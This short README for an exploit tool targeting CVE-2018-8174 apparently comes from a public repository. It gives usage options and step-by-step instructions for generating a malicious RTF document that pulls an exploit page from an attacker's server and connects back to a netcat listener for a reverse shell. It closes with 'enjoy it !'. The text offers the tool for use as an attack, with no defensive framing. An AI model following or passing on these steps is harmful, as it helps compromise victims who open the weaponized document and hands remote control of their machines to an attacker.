# CVE-2018-8174_EXP
usage: CVE-2018-8174.py [-h] -u URL -o OUTPUT [-i IP] [-p PORT]

Exploit for CVE-2018-8174

optional arguments:
  -h, --help            show this help message and exit
  -u URL, --url URL     exp url
  -o OUTPUT, --output OUTPUT
                        Output exploit rtf
  -i IP, --ip IP        ip for netcat
  -p PORT, --port PORT  port for netcat

eg:
1. python CVE-2018-8174.py -u http://1.1.1.1/exploit.html -o exp.rtf -i 2.2.2.2 -p 4444
2. put exploit.html on your server （1.1.1.1）
3. netcat listen  on [any] 4444 (2.2.2.2)

enjoy it !
